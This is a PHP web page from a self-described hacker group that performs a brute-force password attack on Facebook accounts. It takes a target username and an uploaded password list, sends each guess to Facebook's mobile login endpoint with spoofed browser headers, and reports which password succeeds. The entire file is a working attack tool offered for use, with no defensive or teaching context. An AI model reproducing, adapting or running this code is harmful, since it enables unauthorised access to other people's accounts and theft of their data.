<html>
<title>Facebook Brute Force</title>
<link href='http://fonts.googleapis.com/css?family=Federant' rel='stylesheet' type='text/css'/>
     <link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css" />
 <style type="text/css">
 body {
	   background:black; font-size:11px;
	   font-family: Federant;
    color: white;  }
 a {
     color: dodgerblue;
     font-family: Federant;
      }
 a:hover {
     border-bottom:1px solid aqua;
      }
 #menu a {
 	 font-family: Federant;
    	padding:4px 15px;
    	margin:0;
    	background:darkred;
    	color:white;
    	text-decoration:none;
    	letter-spacing:2px;
    	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
       #menu a:hover {
    	padding:4px 15px;
    	margin:0;
    	 font-family: Federant;
    	background: grey;
    	color:white;
    	text-decoration:none;
    	letter-spacing:2px;
    	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
  textarea {
  	   width:600px;
  	   height:200px;
  	   background: black;
  	   border:1px solid darkred;
  	   color: white;
  	   font-family: Federant;
  	   }
  input[type=text] , input[type=file] , select {   
       background:black;
       color:white;border: 1px solid darkred; 
       padding:6px 6px 6px 6px;
       font-family: Federant;
        }
  input[type=submit] {
       background:#b70505;
       color:white;border: 1px solid #000; 
       padding:6px 6px 6px 6px;
       font-family: Federant;
       }
  button[type=submit] {
       background:#b70505;
       color:white;border: 1px solid #000; 
       padding:6px 6px 6px 6px;
       font-family: Federant;
       }
  .subbtn:hover {
  	   background:#c0bfbf;
  	   color:#000000;
  	   font-family: Federant;
  	   }

td, th { font-size: 12pt; text-align: left; vertical-align: top; color: dodgerblue; }
h1           { font-size: 16pt; text-align: center; }
h1 a         { color: #000000 !important; text-decoration: none; }
p            { text-align: center; font-size: 9pt; }
p a          { color: #666666 !important; }
table        {  margin: 0 auto; border-collapse: collapse; border: 1px solid #ffffff; min-width: 400px; }
th, td       { padding: 5px 10px; }
th           { background: black; color: #ffffff; }
td a         { color: dodgerblue !important; text-decoration: none; }
th img       { position: relative; top: -3px; left: 2px; }
td           { border-bottom: 1px solid #cccccc; background: black; }
tr.odd td    { background: black; }

#lol a {
    	padding:4px 15px;
    	margin:0;
    	background:darkgreen;
    	color:white;
    	text-decoration:none;
    	letter-spacing:2px;
    	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
       }
	  
</style>
<?php
// ============================= //
# Facebook Brute Force
# Created by Lyonc
# Recode by Mr.T959
# Garuda Security Hacker
# Use On Localhost
// ============================= //

error_reporting(0);

$user = $_POST['tguser'];

echo '<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Brute Force</title>
</head>
<body>
<center>
';

if(isset($_POST['startbf']) && !empty($user) && $_FILES['netfile']['size'] !== 0){
$textkskc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123457890';
$panj = 15;
$txtl = strlen($textkskc)-1;
$uploadz = '';
for($i=1; $i<=$panj; $i++){
$uploadz .= $textkskc[rand(0, $txtl)];
}
if(move_uploaded_file($_FILES['netfile']['tmp_name'], $uploadz)){
$passlists = file_get_contents($uploadz);
unlink($uploadz);
}else{
$passlists = '';
}
$listspass = explode("\n", $passlists);
if(isset($_POST['brift'])){
foreach($listspass as $pass){
if(logfb(urlencode($user), urlencode($pass))){
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
break;
}else{
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
}
}
}else{
foreach($listspass as $pass){
if(logfb(urlencode($user), urlencode($pass))){
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
}else{
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
}
}
}
}else{
echo '<form method="post" enctype="multipart/form-data">
<b><font size="6" color="red">Facebook Brute Force</font></b><br/><br/>
<b>Target Username</b><br/>
<input type="text" size="40" name="tguser" placeholder="Target Username" value="'.htmlspecialchars($user).'"><br/><br/>
<b>Password Lists</b><br/>
<input type="file" name="netfile"><br/>
<input type="checkbox" name="brift" value="Break If True"><font color="red">Break If True</font><br/><br/>
<input type="submit" name="startbf" value="START">
</form>
';
}

echo '</center>
</body>';

function logfb($login_email, $login_pass){
$cookielog = 'gsh_cookie';
$fp = fopen($cookielog, 'w');
fwrite($fp, '');
fclose($fp);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$login_email.'&pass='.$login_pass.'&login=Login');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookielog);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookielog);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3');
curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
$page = curl_exec($ch) or die('<font color="red">Can\'t Connect to Host</font>');
if(eregi('<title>Facebook</title>', $page) || eregi('id="checkpointSubmitButton"', $page)){
return TRUE;
}else{
return FALSE;
}
}
?>